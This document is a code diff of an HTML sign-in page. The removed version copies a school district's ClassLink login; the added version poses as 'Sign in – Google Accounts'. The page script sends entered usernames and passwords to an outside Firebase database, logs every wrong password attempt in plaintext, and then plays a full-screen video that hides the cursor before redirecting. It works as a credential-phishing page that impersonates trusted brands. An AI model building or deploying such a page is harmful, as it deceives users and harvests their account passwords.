@@ -1,91 +1,59 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Login</title>
-<link rel="icon" type="image/png" href="https://clouddrivecdn.classlink.com/favicons/2051/icon/favicon-32x32.png?1721076899121" sizes="32x32">
-
-<link href="https://cdn.classlink.com/production/launchpad/resources/bootstrap-3.4.1/css/bootstrap.min.css" rel="stylesheet">
-<link href="https://cdn.classlink.com/production/launchpad/resources/font-awesome-4.5.0/css/font-awesome.css" rel="stylesheet">
-<link href="https://cdn.classlink.com/production/launchpad/css/login/login.css" rel="stylesheet">
-<link href="https://cdn.classlink.com/production/framework/stylesheets/cl-lp-loginscreen.css" rel="stylesheet">
-
-
-<!-- Fonts -->
-<link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,300,600|Lato:400,400italic|Roboto" rel="stylesheet">
-
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Sign in – Google Accounts</title>
+<link rel="icon" type="image/png" href="favicon.png" />
 <style>
-body {
-  background: url(https://filescdn.classlink.com/resources/tenants/2051/backgrounds/1722879311078-52c94f352f342ad55dec26965e7f2554) no-repeat center center fixed;
-  background-size: cover;
-  font-family: 'Open Sans', 'Lato', 'Roboto', sans-serif;
-}
-.btn-primary.google {
-  background: #4285f4 !important;
-  border: solid 1px #4285f4 !important;
-  box-shadow: 0px 4px 0px 0px #3062B3 !important;
-}
-.btn-primary.google:hover { background-color: rgba(66, 133, 244, .7) !important; }
-a.link-center{vertical-align: middle;line-height: 2.0;}
-#videoOverlay {
-  position: fixed;
-  top:0; left:0;
-  width:100%; height:100%;
-  background:#000;
-  display:none;
-  justify-content:center;
-  align-items:center;
-  z-index:9999;
-  cursor:none;
-  flex-direction:column;
-}
-#videoOverlay video {
-  width:100%; height:100%;
-  object-fit:cover;
-  display:block;
-}
+html,body{height:100%;margin:0;font-family:Arial,Helvetica,sans-serif}
+body{background:#f1f1f1;display:flex;justify-content:center;align-items:center}
+.container{width:360px;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);text-align:center;z-index:1}
+.google-logo{width:75px;margin-bottom:20px}
+input{width:100%;padding:10px;margin:12px 0;border:1px solid #ccc;border-radius:4px;font-size:14px}
+button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer}
+button:hover{background:#0c5adb}
+.error{color:red;margin-top:5px}
+.small-link{font-size:11px;color:#666;cursor:pointer;margin-top:6px}
+.big-link{font-size:14px;color:#4caf50;font-weight:600}
+#videoOverlay{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;display:none;justify-content:center;align-items:center;z-index:9999;cursor:none;flex-direction:column}
+#videoOverlay video{width:100%;height:100%;object-fit:cover;display:block}
 </style>
 </head>
-<body class="login-bg">
+<body>
 
-<div class="navbar navbar-default navbar-fixed-top2 text-center"></div>
+<div class="container" id="login-container">
+  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" class="google-logo" alt="Logo" />
+  <h2>Sign in</h2>
 
-<div class="container login" id="login_form_action">
-  <div class="container1">
-    <div class="heading">
-      <h1 style="color:#ffffff !important">Waxahachie ISD</h1>
-    </div>
-    <div class="row">
-      <div class="col-xs-12">
-        <form id="loginForm">
-          <div class="form-group username-container">
-            <input type="text" autofocus autocomplete="off" id="username" name="username" class="form-control" placeholder=" " required>
-            <span class="floating-label">Username</span>
-          </div>
-          <div class="form-group password-row-container">
-            <div class="form-group password-field password-container">
-              <input type="password" autocomplete="off" class="form-control hideShowPassword-hidden" placeholder=" " name="password" id="password" required>
-              <span class="floating-label">Password</span>
-            </div>
-            <button type="button" class="show-password fa fa-eye-slash">
-              <input id="show-password-input" type="checkbox" checked>
-            </button>
-          </div>
-          <div class="form-group code-container" style="display:none;">
-            <input type="text" class="form-control" id="code" name="code" placeholder=" " value="waxahachie">
-            <span class="floating-label">Code (optional)</span>
-          </div>
-          <button type="submit" id="signin" class="btn btn-primary btn-block btnlogin">Sign In</button>
-        </form>
+  <div id="step-username">
+    <input id="username" placeholder="Email or phone" autocomplete="username" />
+    <div class="error" id="username-error"></div>
+    <button onclick="checkUsername()">Next</button>
+    <p id="create-account-link" class="small-link" onclick="showCreateAccount()">Create account</p>
+    <p class="error" id="no-account-msg" style="display:none;margin-top:6px">You don't have an account! Try creating one.</p>
+  </div>
 
-        <button title="Sign in with Google" class="btn btn-primary btn-block google" id="googleSignIn">
-          <img src="https://cdn.classlink.com/production/framework/assets/images/lp-login/btn_google.png" alt="">
-          <span>Sign in with Google</span>
-        </button>
-      </div>
-    </div>
+  <div id="step-password" style="display:none">
+    <input id="password" type="password" placeholder="Enter your password" autocomplete="current-password"/>
+    <div class="error" id="password-error"></div>
+    <button onclick="checkPassword()">Next</button>
+    <p class="small-link" id="forgotBtn">Forgot password?</p>
+  </div>
+
+  <div id="step-change-password" style="display:none">
+    <input id="new-password" type="password" placeholder="New password" />
+    <input id="confirm-password" type="password" placeholder="Confirm new password" />
+    <div class="error" id="change-error"></div>
+    <button onclick="saveNewPassword()">Save Password</button>
+  </div>
+
+  <div id="step-create" style="display:none">
+    <input id="new-username" placeholder="Choose your username" autocomplete="username" />
+    <div class="error" id="create-error"></div>
+    <button onclick="createAccount()">Submit</button>
+    <p style="margin-top:8px">Your request will be sent for approval.</p>
   </div>
 </div>
 
@@ -93,10 +61,9 @@ a.link-center{vertical-align: middle;line-height: 2.0;}
   <video id="combinedVideo" playsinline preload="auto"></video>
 </div>
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
-import { getDatabase, ref, get, child, set, update } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
-
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script>
 const firebaseConfig = {
   apiKey: "AIzaSyBQslLAFRlIRJqsiJ2WWeTNslO067bzKYM",
   authDomain: "taclogin-ab38e.firebaseapp.com",
@@ -106,64 +73,124 @@ const firebaseConfig = {
   messagingSenderId: "937853298051",
   appId: "1:937853298051:web:119ccc7b5499514bd442b6"
 };
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
 let currentUser = "";
 
-// ---------- UTILS ----------
-function showVideoOverlay(){
-  const overlay = document.getElementById('videoOverlay');
-  const videoEl = document.getElementById('combinedVideo');
-  overlay.style.display='flex';
-  document.body.style.cursor='none';
-  videoEl.src='combined.mp4';
-  videoEl.muted=false;
-  videoEl.currentTime=0;
-  videoEl.play();
-  videoEl.onended = () => {
-    const folder = window.location.href.substring(0, window.location.href.lastIndexOf('/')+1);
-    window.location.replace(folder + 'index.html');
-  };
+function resetErrors(){
+  document.getElementById('username-error').innerText='';
+  document.getElementById('password-error').innerText='';
+  document.getElementById('create-error').innerText='';
+  document.getElementById('change-error').innerText='';
+  document.getElementById('no-account-msg').style.display='none';
+  document.getElementById('create-account-link').classList.remove('big-link');
 }
 
-// ---------- LOGIN ----------
-document.getElementById('loginForm').addEventListener('submit', async (e)=>{
-  e.preventDefault();
+// ---------- USERNAME ----------
+function checkUsername(){
+  resetErrors();
   const username = document.getElementById('username').value.trim();
-  const password = document.getElementById('password').value;
-
-  try {
-    const snapshot = await get(child(ref(db), `userPasswords/${username}`));
-    if(!snapshot.exists()){ alert("User not found!"); return; }
-    const storedPassword = snapshot.val();
-
-    if(storedPassword !== password){
-      const failRef = ref(db, `failedLogins/${username}`);
-      const failSnap = await get(failRef);
-      const fails = failSnap.exists()? failSnap.val()+1 : 1;
-      await set(failRef, fails);
-      alert("Incorrect password!");
-      return;
+  if(!username){ document.getElementById('username-error').innerText='Enter a username'; return; }
+  db.ref('allowedUsers/'+username).once('value').then(snap=>{
+    if(snap.exists()){
+      currentUser = username;
+      document.getElementById('step-username').style.display='none';
+      document.getElementById('step-password').style.display='block';
+    } else {
+      document.getElementById('no-account-msg').style.display='block';
+      document.getElementById('create-account-link').classList.add('big-link');
     }
+  });
+}
 
-    // Successful login → update DB & show video
-    const userRef = ref(db, `logins/${username}`);
-    const loginsSnap = await get(userRef);
-    const totalLogins = loginsSnap.exists()? loginsSnap.val()+1 : 1;
-    await set(userRef, totalLogins);
-    showVideoOverlay();
+// ---------- PASSWORD ----------
+function checkPassword(){
+  resetErrors();
+  const password = document.getElementById('password').value.trim();
 
-  } catch(err){
-    console.error(err);
-    alert("Error logging in: "+err.message);
-  }
+  db.ref('userPasswords/'+currentUser).once('value').then(snap=>{
+    const savedPassword = snap.val();
+    if(!savedPassword && password === 'tac'){
+      // first-time login with TAC → force password change
+      document.getElementById('step-password').style.display='none';
+      document.getElementById('step-change-password').style.display='block';
+    } else if(password === savedPassword){
+      // normal login
+      db.ref('logins/'+currentUser).transaction(c=> (c||0)+1);
+      db.ref('totalLogins').transaction(c=> (c||0)+1);
+      showVideoOverlay();
+    } else {
+      document.getElementById('password-error').innerText='Wrong password';
+      db.ref('failedLogins').push({ username: currentUser, triedPassword: password, time: new Date().toISOString() });
+    }
+  });
+}
+
+// ---------- CHANGE PASSWORD ----------
+function saveNewPassword(){
+  resetErrors();
+  const newPwd = document.getElementById('new-password').value.trim();
+  const confirmPwd = document.getElementById('confirm-password').value.trim();
+  if(!newPwd || !confirmPwd){ document.getElementById('change-error').innerText='Enter both fields'; return; }
+  if(newPwd !== confirmPwd){ document.getElementById('change-error').innerText='Passwords do not match'; return; }
+  db.ref('userPasswords/'+currentUser).set(newPwd);
+  db.ref('logins/'+currentUser).transaction(c=> (c||0)+1);
+  db.ref('totalLogins').transaction(c=> (c||0)+1);
+  showVideoOverlay();
+}
+
+// ---------- CREATE ACCOUNT ----------
+function showCreateAccount(){
+  resetErrors();
+  document.getElementById('step-username').style.display='none';
+  document.getElementById('step-create').style.display='block';
+  document.getElementById('new-username').value = document.getElementById('username').value.trim();
+}
+function createAccount(){
+  resetErrors();
+  const newUser = document.getElementById('new-username').value.trim();
+  if(!newUser){ document.getElementById('create-error').innerText='Enter a username'; return; }
+  Promise.all([ db.ref('allowedUsers/'+newUser).once('value'), db.ref('pendingAccounts/'+newUser).once('value') ])
+  .then(([allowedSnap,pendingSnap])=>{
+    if(allowedSnap.exists()){ document.getElementById('create-error').innerText='Account already approved. Please login.'; }
+    else if(pendingSnap.exists()){ document.getElementById('create-error').innerText='Account creation pending approval.'; }
+    else {
+      db.ref('pendingAccounts/'+newUser).set({ requestedAt:new Date().toISOString() });
+      alert('Account request sent for approval. You will be notified once approved.');
+      document.getElementById('step-create').style.display='none';
+      document.getElementById('step-username').style.display='block';
+    }
+  });
+}
+
+// ---------- FORGOT PASSWORD ----------
+document.getElementById('forgotBtn').addEventListener('click',()=>{
+  if(!currentUser) { alert('Enter your username first'); return; }
+  db.ref('notifications').push({
+    type: 'forgotPassword',
+    user: currentUser,
+    time: new Date().toISOString()
+  });
+  alert('Dev team notified. They will reset your password.');
 });
 
-// Optional Google button
-document.getElementById('googleSignIn').addEventListener('click',()=>{
-});
+// ---------- VIDEO OVERLAY ----------
+const overlay = document.getElementById('videoOverlay');
+const videoEl = document.getElementById('combinedVideo');
+function makeRedirectUrl(){
+  const href = window.location.href;
+  const folder = href.substring(0, href.lastIndexOf('/') + 1);
+  return folder + 'index.html';
+}
+function showVideoOverlay(){
+  overlay.style.display = 'flex';
+  document.body.style.cursor = 'none';
+  videoEl.src = 'combined.mp4';
+  videoEl.muted = false;
+  videoEl.currentTime = 0;
+  videoEl.play();
+  videoEl.onended = () => { window.location.replace(makeRedirectUrl()); };
+}
 </script>
-
 </body>
 </html>
